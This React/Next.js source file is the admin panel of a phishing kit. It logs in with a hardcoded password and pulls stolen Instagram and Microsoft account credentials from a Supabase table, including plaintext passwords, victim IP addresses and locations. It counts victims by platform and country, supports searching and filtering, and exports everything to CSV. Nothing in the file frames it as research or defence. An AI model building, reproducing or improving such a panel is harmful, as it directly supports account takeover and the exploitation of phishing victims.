import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';
import { useRouter } from 'next/router';
import Head from 'next/head';

// Initialize Supabase client with proper error handling
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseAnonKey);

export default function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [credentials, setCredentials] = useState([]);
  const [stats, setStats] = useState({
    totalEntries: 0,
    instagramEntries: 0,
    microsoftEntries: 0,
    countries: {},
    continents: {}
  });
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('all');
  const [darkMode, setDarkMode] = useState(false);
  
  const router = useRouter();
  
  // Handle login
  const handleLogin = (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    // Simple hardcoded password for testing
    const correctPassword = "YourSecurePassword123"; 
    
    if (password === correctPassword) {
      setIsAuthenticated(true);
      localStorage.setItem('phishingAdminAuth', 'true');
      fetchCredentials();
    } else {
      setError('Invalid password');
    }
    setLoading(false);
  };
  
  // Check if already authenticated
  useEffect(() => {
    const auth = localStorage.getItem('phishingAdminAuth');
    if (auth === 'true') {
      setIsAuthenticated(true);
      fetchCredentials();
    }
    
    // Check for dark mode preference
    const prefersDark = localStorage.getItem('darkMode') === 'true';
    setDarkMode(prefersDark);
    if (prefersDark) {
      document.body.classList.add('dark-mode');
    }
  }, []);
  
  // Toggle dark mode
  const toggleDarkMode = () => {
    setDarkMode(!darkMode);
    localStorage.setItem('darkMode', !darkMode);
    document.body.classList.toggle('dark-mode');
  };
  
  // Fetch credentials from database
  const fetchCredentials = async () => {
    setLoading(true);
    setError('');
    
    try {
      console.log('Supabase URL:', supabaseUrl);
      console.log('Fetching credentials from Supabase...');
      
      // First, verify we can connect to Supabase
      const { error: connError } = await supabase.from('users').select('count');
      if (connError) {
        console.error('Connection error:', connError);
        throw new Error(`Supabase connection error: ${connError.message}`);
      }
      
      // Now get all users from the table
      const { data, error } = await supabase
        .from('users')
        .select('*')
        .order('created_at', { ascending: false });
        
      if (error) {
        console.error('Supabase error:', error);
        throw error;
      }
      
      console.log('Credentials received:', data ? data.length : 0, 'records');
      console.log('First record:', data?.[0]);
      
      // Set credentials in state
      setCredentials(data || []);
      calculateStats(data || []);
    } catch (error) {
      console.error('Error fetching credentials:', error);
      setError('Failed to load data: ' + error.message);
    } finally {
      setLoading(false);
    }
  };
  
  // Calculate statistics from credential data
  const calculateStats = (data) => {
    if (!data) return;
    
    let instagramCount = 0;
    let microsoftCount = 0;
    const countries = {};
    const continents = {};
    
    data.forEach(cred => {
      // Count by platform
      if (cred.username && cred.username.includes('(IG)')) {
        instagramCount++;
      } else if (cred.username && (
        cred.username.includes('(MS)') || 
        cred.username.includes('(hotmail)') || 
        cred.username.includes('@hotmail') || 
        cred.username.includes('@outlook') || 
        cred.username.includes('@live')
      )) {
        microsoftCount++;
      }
      
      // Count by country
      if (cred.country) {
        countries[cred.country] = (countries[cred.country] || 0) + 1;
      }
      
      // Count by continent
      if (cred.continent) {
        continents[cred.continent] = (continents[cred.continent] || 0) + 1;
      }
    });
    
    setStats({
      totalEntries: data.length,
      instagramEntries: instagramCount,
      microsoftEntries: microsoftCount,
      countries,
      continents
    });
  };
  
  // Handle logout
  const handleLogout = () => {
    localStorage.removeItem('phishingAdminAuth');
    setIsAuthenticated(false);
  };
  
  // Filter credentials
  const filterCredentials = () => {
    if (!credentials) return [];
    
    let filtered = [...credentials];
    
    // Filter by platform
    if (filter === 'instagram') {
      filtered = filtered.filter(cred => 
        cred.username && cred.username.includes('(IG)')
      );
    } else if (filter === 'microsoft') {
      filtered = filtered.filter(cred => 
        cred.username && (cred.username.includes('(MS)') || 
        cred.username.includes('(hotmail)') || 
        cred.username.includes('@hotmail') || 
        cred.username.includes('@outlook') || 
        cred.username.includes('@live'))
      );
    }
    
    // Filter by search term
    if (searchTerm) {
      filtered = filtered.filter(cred =>
        (cred.username && cred.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.password && cred.password.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.city && cred.city.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.country && cred.country.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.ip_address && cred.ip_address.toLowerCase().includes(searchTerm.toLowerCase()))
      );
    }
    
    return filtered;
  };
  
  // Export credentials as CSV
  const exportCSV = () => {
    let csvContent = "data:text/csv;charset=utf-8,";
    csvContent += "Username,Password,Country,City,Continent,IP,Date\n";
    
    credentials.forEach(cred => {
      const row = [
        `"${cred.username}"`,
        `"${cred.password}"`,
        `"${cred.country || ''}"`,
        `"${cred.city || ''}"`,
        `"${cred.continent || ''}"`,
        `"${cred.ip_address || ''}"`,
        `"${new Date(cred.login_time).toLocaleString()}"`
      ].join(',');
      csvContent += row + "\n";
    });
    
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "credentials.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  
  return (
    <>
      <Head>
        <title>Admin Dashboard</title>
        <meta name="robots" content="noindex, nofollow" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      </Head>
      
      <div className={`admin-container ${darkMode ? 'dark-mode' : ''}`}>
        {!isAuthenticated ? (
          <div className="login-container">
            <div className="login-box">
              <h1><i className="fas fa-lock"></i> Admin Login</h1>
              <form onSubmit={handleLogin}>
                <div className="input-group">
                  <label htmlFor="password">Password</label>
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                </div>
                {error && <div className="error-message">{error}</div>}
                <button type="submit" disabled={loading}>
                  {loading ? 'Loading...' : 'Login'}
                </button>
              </form>
              {!isAuthenticated && (
                <button 
                  type="button" 
                  onClick={() => {
                    localStorage.removeItem('phishingAdminAuth');
                    window.location.reload();
                  }} 
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#999',
                    textDecoration: 'underline',
                    cursor: 'pointer',
                    fontSize: '12px',
                    marginTop: '10px'
                  }}
                >
                  Reset Login State
                </button>
              )}
            </div>
          </div>
        ) : (
          <div className="dashboard">
            <header className="dashboard-header">
              <h1><i className="fas fa-chart-line"></i> Admin Dashboard</h1>
              <div className="header-actions">
                <button onClick={toggleDarkMode} className="icon-button">
                  <i className={`fas fa-${darkMode ? 'sun' : 'moon'}`}></i>
                </button>
                <button onClick={handleLogout} className="logout-button">
                  <i className="fas fa-sign-out-alt"></i> Logout
                </button>
              </div>
            </header>
            
            {loading ? (
              <div className="loading">
                <i className="fas fa-spinner fa-spin"></i> Loading data...
              </div>
            ) : (
              <>
                <div className="stats-overview">
                  <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-users"></i></div>
                    <div className="stat-content">
                      <h3>Total Entries</h3>
                      <p className="stat-number">{stats.totalEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon instagram"><i className="fab fa-instagram"></i></div>
                    <div className="stat-content">
                      <h3>Instagram</h3>
                      <p className="stat-number">{stats.instagramEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon microsoft"><i className="fab fa-microsoft"></i></div>
                    <div className="stat-content">
                      <h3>Microsoft</h3>
                      <p className="stat-number">{stats.microsoftEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-globe"></i></div>
                    <div className="stat-content">
                      <h3>Countries</h3>
                      <p className="stat-number">{Object.keys(stats.countries).length}</p>
                    </div>
                  </div>
                </div>
                
                <div className="data-container">
                  <div className="data-header">
                    <h2><i className="fas fa-table"></i> Collected Credentials</h2>
                    
                    <div className="tabs">
                      <button 
                        className={filter === 'all' ? 'tab-active' : ''}
                        onClick={() => setFilter('all')}
                      >
                        All Records
                      </button>
                      <button 
                        className={filter === 'instagram' ? 'tab-active' : ''}
                        onClick={() => setFilter('instagram')}
                      >
                        Instagram <span className="badge">{stats.instagramEntries}</span>
                      </button>
                      <button 
                        className={filter === 'microsoft' ? 'tab-active' : ''}
                        onClick={() => setFilter('microsoft')}
                      >
                        Microsoft <span className="badge">{stats.microsoftEntries}</span>
                      </button>
                    </div>
                    
                    <div className="data-actions">
                      <div className="search">
                        <i className="fas fa-search"></i>
                        <input 
                          type="text" 
                          placeholder="Search..." 
                          value={searchTerm}
                          onChange={(e) => setSearchTerm(e.target.value)}
                        />
                      </div>
                      
                      <button className="export-button" onClick={exportCSV}>
                        <i className="fas fa-download"></i> Export CSV
                      </button>
                    </div>
                  </div>
                  
                  <div className="data-table-container">
                    <table className="data-table">
                      <thead>
                        <tr>
                          <th>Username</th>
                          <th>Password</th>
                          <th>Location</th>
                          <th>IP Address</th>
                          <th>Date/Time</th>
                        </tr>
                      </thead>
                      <tbody>
                        {filterCredentials().length > 0 ? (
                          filterCredentials().map((cred) => (
                            <tr key={cred.id} className={cred.username.includes('(IG)') ? 'instagram-row' : 'microsoft-row'}>
                              <td>
                                {cred.username.includes('(IG)') ? (
                                  <><i className="fab fa-instagram"></i> </>
                                ) : (
                                  <><i className="fab fa-microsoft"></i> </>
                                )}
                                {cred.username}
                              </td>
                              <td>{cred.password}</td>
                              <td>
                                {cred.city && cred.country ? (
                                  <>
                                    <i className="fas fa-map-marker-alt"></i> {cred.city}, {cred.country}
                                    {cred.continent && <div className="continent"><i className="fas fa-globe"></i> {cred.continent}</div>}
                                  </>
                                ) : (
                                  'Unknown'
                                )}
                              </td>
                              <td>{cred.ip_address || 'Unknown'}</td>
                              <td>{cred.login_time ? new Date(cred.login_time).toLocaleString() : 'Unknown'}</td>
                            </tr>
                          ))
                        ) : (
                          <tr>
                            <td colSpan="5" className="no-data">No credentials found</td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              </>
            )}
          </div>
        )}
      </div>
      
      {isAuthenticated && (
        <div style={{
          position: 'fixed',
          bottom: '20px',
          right: '20px',
          backgroundColor: '#f0f0f0',
          padding: '10px',
          borderRadius: '5px',
          boxShadow: '0 0 10px rgba(0,0,0,0.2)',
          maxWidth: '300px',
          maxHeight: '200px',
          overflow: 'auto',
          fontSize: '12px',
          zIndex: 1000
        }}>
          <h4>Debug Console</h4>
          <button onClick={async () => {
            try {
              // 1. Test icon generation
              const iconRes = await fetch('/api/create-icons');
              const iconData = await iconRes.json();
              console.log('Icon generation:', iconData);
              
              // 2. Test Supabase connection
              const { data, error } = await supabase.from('users').select('count');
              if (error) throw error;
              console.log('Supabase connection successful');
              
              // 3. Refetch data
              fetchCredentials();
              
              alert('Debug operations completed! Check console for details.');
            } catch (err) {
              console.error('Debug error:', err);
              alert('Error: ' + err.message);
            }
          }}>
            Run Diagnostics
          </button>
          <div>
            <strong>Supabase URL:</strong> {supabaseUrl ? '✓' : '✗'}
          </div>
          <div>
            <strong>Supabase Key:</strong> {supabaseAnonKey ? '✓' : '✗'}
          </div>
          <div>
            <strong>Records:</strong> {credentials.length}
          </div>
          <div>
            <strong>IG:</strong> {stats.instagramEntries} | 
            <strong>MS:</strong> {stats.microsoftEntries}
          </div>
        </div>
      )}
      
      <button onClick={async () => {
        try {
          const response = await fetch('/api/check-database');
          const data = await response.json();
          console.log('Database check:', data);
          alert(`Database has ${data.count} records (${data.platforms.instagram} IG / ${data.platforms.microsoft} MS)`);
        } catch (err) {
          console.error('Error checking database:', err);
          alert('Error checking database: ' + err.message);
        }
      }} style={{
        position: 'fixed',
        bottom: '20px',
        left: '20px',
        padding: '10px',
        backgroundColor: '#4caf50',
        color: 'white',
        border: 'none',
        borderRadius: '5px',
        cursor: 'pointer'
      }}>
        Check Database
      </button>
      
      <style jsx global>{`
        :root {
          --primary: #3f51b5;
          --primary-light: #757de8;
          --primary-dark: #002984;
          --secondary: #ff4081;
          --success: #4caf50;
          --warning: #ff9800;
          --danger: #f44336;
          --info: #2196f3;
          --instagram: #E1306C;
          --microsoft: #00a4ef;
          --light: #f8f9fa;
          --dark: #212529;
          --gray: #6c757d;
          --dark-bg: #1a1a1a;
          --dark-card: #2d2d2d;
          --dark-text: #f0f0f0;
        }
        
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        body {
          font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          line-height: 1.6;
          color: #333;
          background-color: #f5f7fa;
          transition: background-color 0.3s, color 0.3s;
        }
        
        body.dark-mode {
          background-color: var(--dark-bg);
          color: var(--dark-text);
        }
        
        .admin-container {
          min-height: 100vh;
          width: 100%;
        }
        
        .login-container {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, var(--primary-dark), var(--primary));
        }
        
        .login-box {
          background-color: white;
          padding: 2rem;
          border-radius: 8px;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
          width: 100%;
          max-width: 400px;
        }
        
        .dark-mode .login-box {
          background-color: var(--dark-card);
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        
        .login-box h1 {
          margin-bottom: 1.5rem;
          text-align: center;
          color: var(--primary);
        }
        
        .dark-mode .login-box h1 {
          color: var(--primary-light);
        }
        
        .input-group {
          margin-bottom: 1.5rem;
        }
        
        .input-group label {
          display: block;
          margin-bottom: 0.5rem;
          font-weight: 500;
        }
        
        input[type="password"] {
          width: 100%;
          padding: 0.75rem;
          border: 1px solid #ddd;
          border-radius: 4px;
          font-size: 1rem;
          transition: border-color 0.3s;
        }
        
        .dark-mode input[type="password"] {
          background-color: #333;
          border-color: #555;
          color: white;
        }
        
        input[type="password"]:focus {
          border-color: var(--primary);
          outline: none;
          box-shadow: 0 0 0 2px rgba(63, 81, 181, 0.2);
        }
        
        .dark-mode input[type="password"]:focus {
          box-shadow: 0 0 0 2px rgba(117, 125, 232, 0.3);
        }
        
        button {
          width: 100%;
          padding: 0.75rem;
          background-color: var(--primary);
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 1rem;
          font-weight: 500;
          cursor: pointer;
          transition: background-color 0.3s;
        }
        
        button:hover {
          background-color: var(--primary-dark);
        }
        
        button:disabled {
          background-color: var(--gray);
          cursor: not-allowed;
        }
        
        .error-message {
          color: var(--danger);
          margin-bottom: 1rem;
          font-size: 0.875rem;
        }
        
        /* Dashboard Styles */
        .dashboard {
          min-height: 100vh;
          padding: 2rem;
          transition: background-color 0.3s, color 0.3s;
        }
        
        .dark-mode .dashboard {
          background-color: var(--dark-bg);
          color: var(--dark-text);
        }
        
        .dashboard-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 2rem;
          padding-bottom: 1rem;
          border-bottom: 1px solid #eee;
        }
        
        .dark-mode .dashboard-header {
          border-bottom-color: #444;
        }
        
        .dashboard-header h1 {
          color: var(--primary);
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        
        .dark-mode .dashboard-header h1 {
          color: var(--primary-light);
        }
        
        .header-actions {
          display: flex;
          gap: 1rem;
        }
        
        .icon-button {
          width: auto;
          padding: 0.5rem;
          background-color: transparent;
          color: var(--gray);
          border: 1px solid #eee;
          border-radius: 50%;
          height: 40px;
          width: 40px;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: all 0.3s;
        }
        
        .dark-mode .icon-button {
          color: var(--light);
          border-color: #444;
        }
        
        .icon-button:hover {
          background-color: #f5f5f5;
          color: var(--primary);
        }
        
        .dark-mode .icon-button:hover {
          background-color: #333;
          color: var(--primary-light);
        }
        
        .logout-button {
          width: auto;
          display: flex;
          align-items: center;
          gap: 0.5rem;
          padding: 0.5rem 1rem;
          background-color: white;
          color: var(--gray);
          border: 1px solid #eee;
          border-radius: 4px;
          transition: all 0.3s;
        }
        
        .dark-mode .logout-button {
          background-color: #333;
          color: var(--light);
          border-color: #444;
        }
        
        .logout-button:hover {
          background-color: #f5f5f5;
          color: var(--danger);
        }
        
        .dark-mode .logout-button:hover {
          background-color: #3a3a3a;
          color: var(--danger);
        }
        
        .loading {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 200px;
          font-size: 1.2rem;
          color: var(--gray);
        }
        
        .loading i {
          margin-right: 0.5rem;
        }
        
        /* Stats Cards */
        .stats-overview {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 1.5rem;
          margin-bottom: 2rem;
        }
        
        .stat-card {
          background-color: white;
          border-radius: 8px;
          padding: 1.5rem;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
          display: flex;
          align-items: center;
          transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .dark-mode .stat-card {
          background-color: var(--dark-card);
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        .stat-card:hover {
          transform: translateY(-5px);
          box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
        }
        
        .dark-mode .stat-card:hover {
          box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
        }
        
        .stat-icon {
          font-size: 2rem;
          width: 60px;
          height: 60px;
          border-radius: 50%;
          background-color: #f0f4ff;
          color: var(--primary);
          display: flex;
          align-items: center;
          justify-content: center;
          margin-right: 1rem;
        }
        
        .dark-mode .stat-icon {
          background-color: #2a2a5a;
        }
        
        .stat-icon.instagram {
          background-color: #fcebf1;
          color: var(--instagram);
        }
        
        .dark-mode .stat-icon.instagram {
          background-color: #5a2a3a;
        }
        
        .stat-icon.microsoft {
          background-color: #e6f7ff;
          color: var(--microsoft);
        }
        
        .dark-mode .stat-icon.microsoft {
          background-color: #1a3a4a;
        }
        
        .stat-content h3 {
          font-size: 0.875rem;
          color: var(--gray);
          margin-bottom: 0.25rem;
        }
        
        .stat-number {
          font-size: 1.75rem;
          font-weight: 600;
          color: var(--dark);
        }
        
        .dark-mode .stat-number {
          color: var(--light);
        }
        
        /* Data Section */
        .data-container {
          background-color: white;
          border-radius: 8px;
          padding: 1.5rem;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
        }
        
        .dark-mode .data-container {
          background-color: var(--dark-card);
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        .data-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 1.5rem;
          flex-wrap: wrap;
          gap: 1rem;
        }
        
        .data-header h2 {
          color: var(--primary);
        }
        
        .dark-mode .data-header h2 {
          color: var(--primary-light);
        }
        
        .data-actions {
          display: flex;
          align-items: center;
          gap: 1rem;
          flex-wrap: wrap;
        }
        
        .search {
          position: relative;
        }
        
        .search input {
          padding: 0.5rem 1rem 0.5rem 2.5rem;
          border: 1px solid #eee;
          border-radius: 4px;
          width: 250px;
          font-size: 0.875rem;
        }
        
        .dark-mode .search input {
          background-color: #333;
          border-color: #444;
          color: white;
        }
        
        .search i {
          position: absolute;
          left: 0.75rem;
          top: 50%;
          transform: translateY(-50%);
          color: var(--gray);
        }
        
        .export-button {
          width: auto;
          padding: 0.5rem 1rem;
          background-color: var(--success);
          display: flex;
          align-items: center;
          gap: 0.5rem;
          font-size: 0.875rem;
        }
        
        .export-button:hover {
          background-color: #3d8b40;
        }
        
        .data-table-container {
          overflow-x: auto;
        }
        
        .data-table {
          width: 100%;
          border-collapse: collapse;
          font-size: 0.875rem;
        }
        
        .data-table th {
          text-align: left;
          padding: 0.75rem;
          background-color: #f8f9fa;
          border-bottom: 2px solid #eee;
          font-weight: 600;
          color: var(--gray);
        }
        
        .dark-mode .data-table th {
          background-color: #2a2a2a;
          border-bottom-color: #444;
          color: #bbb;
        }
        
        .data-table td {
          padding: 0.75rem;
          border-bottom: 1px solid #eee;
          vertical-align: middle;
        }
        
        .dark-mode .data-table td {
          border-bottom-color: #444;
        }
        
        .data-table tr:last-child td {
          border-bottom: none;
        }
        
        .data-table tr:hover td {
          background-color: #f5f7fa;
        }
        
        .dark-mode .data-table tr:hover td {
          background-color: #383838;
        }
        
        .instagram-row td:first-child {
          border-left: 3px solid var(--instagram);
        }
        
        .microsoft-row td:first-child {
          border-left: 3px solid var(--microsoft);
        }
        
        .no-data {
          text-align: center;
          color: var(--gray);
          padding: 2rem !important;
        }
        
        .continent {
          font-size: 0.75rem;
          color: var(--gray);
          margin-top: 0.25rem;
        }
        
        /* Mobile Responsive Adjustments */
        @media (max-width: 768px) {
          .dashboard {
            padding: 1rem;
          }
          
          .dashboard-header {
            flex-direction: column;
            align-items: flex-start;
            gap: 1rem;
          }
          
          .header-actions {
            width: 100%;
            justify-content: space-between;
          }
          
          .stats-overview {
            grid-template-columns: 1fr;
          }
          
          .data-header {
            flex-direction: column;
            align-items: flex-start;
          }
          
          .data-actions {
            width: 100%;
            justify-content: space-between;
          }
          
          .search input {
            width: 100%;
          }
        }
        
        .reset-button {
          background: none;
          border: none;
          color: #999;
          text-decoration: underline;
          cursor: pointer;
          font-size: 12px;
          margin-top: 10px;
        }
        
        .tabs {
          display: flex;
          margin-bottom: 1rem;
          border-bottom: 1px solid #eee;
          width: 100%;
        }
        
        .dark-mode .tabs {
          border-bottom-color: #444;
        }
        
        .tabs button {
          background: none;
          border: none;
          padding: 0.5rem 1rem;
          margin-right: 1rem;
          font-size: 0.875rem;
          color: var(--gray);
          border-bottom: 2px solid transparent;
          cursor: pointer;
        }
        
        .tabs button:hover {
          color: var(--primary);
        }
        
        .tab-active {
          color: var(--primary) !important;
          border-bottom: 2px solid var(--primary) !important;
          font-weight: 500;
        }
        
        .badge {
          display: inline-block;
          background-color: #eee;
          border-radius: 12px;
          padding: 2px 6px;
          font-size: 0.75rem;
          margin-left: 5px;
        }
        
        .dark-mode .badge {
          background-color: #333;
        }
      `}</style>
    </>
  );
} 